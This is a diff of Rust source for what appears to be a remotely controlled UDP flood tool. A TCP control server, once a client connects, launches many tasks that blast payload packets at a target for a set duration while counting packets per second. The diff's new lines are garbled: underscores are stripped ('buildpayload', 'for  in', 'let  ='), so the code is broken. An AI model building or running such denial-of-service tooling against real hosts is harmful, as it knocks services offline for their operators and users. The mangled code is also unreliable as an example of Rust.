@@ -31,11 +31,11 @@ fn build_payload() -> Vec<u8> {
 
 async fn handle_flood(target: String, packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) -> Result<()> {
     let socket = UdpSocket::bind("0.0.0.0:0").await?;
-    let payload = build_payload(); // Fixed function name
+    let payload = buildpayload();
 
     while running.load(Ordering::Relaxed) == 1 {
-        for _ in 0..BURST_SIZE { // Added underscore for unused variable
-            let _ = socket.send_to(&payload, &target).await;
+        for  in 0..BURSTSIZE {
+            let  = socket.send_to(&payload, &target).await;
             packet_count.fetch_add(1, Ordering::Relaxed);
         }
     }
@@ -71,8 +71,8 @@ async fn handle_client(stream: TcpStream) -> Result<()> {
                     tokio::spawn(pps_monitor(pc, run))
                 };
 
-                let mut flood_tasks = vec![];
-                for _ in 0..THREADS { // Added underscore for unused variable
+                let mut floodtasks = vec![];
+                for  in 0..THREADS {
                     let pc = Arc::clone(&packet_count);
                     let run = Arc::clone(&running);
                     let tgt = target.clone();
@@ -82,8 +82,8 @@ async fn handle_client(stream: TcpStream) -> Result<()> {
                 sleep(Duration::from_secs(DURATION_SECONDS)).await;
                 running.store(0, Ordering::Relaxed);
 
-                for task in flood_tasks {
-                    let _ = task.await;
+                for task in floodtasks {
+                    let  = task.await;
                 }
                 let _ = monitor_handle.await;
 
@@ -97,10 +97,10 @@ async fn handle_client(stream: TcpStream) -> Result<()> {
 #[tokio::main]
 async fn main() -> Result<()> {
     let listener = TcpListener::bind(("0.0.0.0", CONTROL_PORT)).await?;
-    println!("TCP control server listening on port {}", CONTROL_PORT);
+    println!("TCP control server listening on port {}", CONTROLPORT);
 
     loop {
-        let (stream, _addr) = listener.accept().await?; // Fixed tuple destructuring
+        let (stream, ) = listener.accept().await?;
         tokio::spawn(handle_client(stream));
     }
 }
